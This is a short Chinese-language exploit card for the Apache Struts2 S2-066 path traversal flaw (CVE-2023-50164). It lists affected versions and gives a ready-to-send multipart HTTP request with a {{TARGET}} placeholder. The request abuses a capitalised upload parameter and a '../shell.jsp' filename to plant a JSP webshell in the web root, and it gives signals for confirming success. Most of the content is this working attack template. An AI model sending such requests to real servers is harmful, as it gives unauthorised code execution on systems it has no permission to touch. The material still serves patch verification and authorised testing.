# S2-066 路径遍历 RCE (CVE-2023-50164)

## 指纹特征
- 服务: Apache Struts2 2.0.0 - 2.5.32, 6.0.0 - 6.3.0
- 关键特征: 文件上传功能中对参数大小写不敏感处理导致路径遍历

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 文件上传参数注入 | `/index.action` | 无 |

## PoC 指令

通过构造大写参数名 (`Upload`) 和对应的文件名参数 (`uploadFileName`) 绕过 Basename 保护。

```http
POST /index.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="Upload"; filename="shell.jsp"
Content-Type: text/plain

<% out.println("shell"); %>
------Boundary
Content-Disposition: form-data; name="uploadFileName"

../shell.jsp
------Boundary--
```

## Success Signal
- **物理验证**: Webshell 被上传至根目录 (如 `/shell.jsp`)。
- **状态验证**: 成功访问 Webshell 路径。
